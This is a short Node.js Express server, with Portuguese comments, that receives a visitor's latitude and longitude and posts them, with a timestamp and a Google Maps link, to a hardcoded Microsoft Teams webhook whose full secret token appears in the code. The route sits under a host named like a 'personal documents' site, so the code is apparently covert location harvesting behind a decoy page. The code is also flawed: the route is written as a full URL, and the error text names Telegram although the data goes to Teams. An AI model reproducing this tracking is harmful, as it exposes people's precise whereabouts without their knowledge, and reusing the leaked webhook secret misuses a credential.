// server.js
const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");

const app = express();
app.use(cors());
app.use(bodyParser.json());
const path = require("path");

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.post("https://docspessoais.vercel.app/send-location", async (req, res) => {
  const { latitude, longitude } = req.body;

  const data = new Date();
  const opcoes = {
    timeZone: "America/Sao_Paulo",
    hour: "2-digit",
    minute: "2-digit",
    hour12: false, // ou true se quiser 12h com AM/PM
  };
  const webhookTeams = 'https://liberfly.webhook.office.com/webhookb2/6f36c4e6-d09b-43c9-8525-949242335332@aed8f6aa-180a-45d5-9067-9f6e6ad5ac7d/IncomingWebhook/faa24cb8d86d4334a9cca834e6747625/2c3f85c3-ecca-4aaa-8fd7-e79d969cc838/V2FkS_wm-qtmODWS17X1yKjMlVt-oMWilz3aoRdLaafkg1'
  const horaBrasilia = data.toLocaleTimeString("pt-BR", opcoes);
  const message = `Localização do usuário: ${horaBrasilia} - https://www.google.com.br/maps/place/${latitude},${longitude}`;

  try {
    
    const response = await axios.post(webhookTeams, {
      text: message,
    })

    console.log('Mensagem enviada com sucesso', response.data);

    console.log(message);
    res.status(200).json({ success: true });
  } catch (error) {
    console.log(error);
    res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
  }
});

app.listen(8800, () => {
  console.log("Servidor rodando na porta 8800");
});
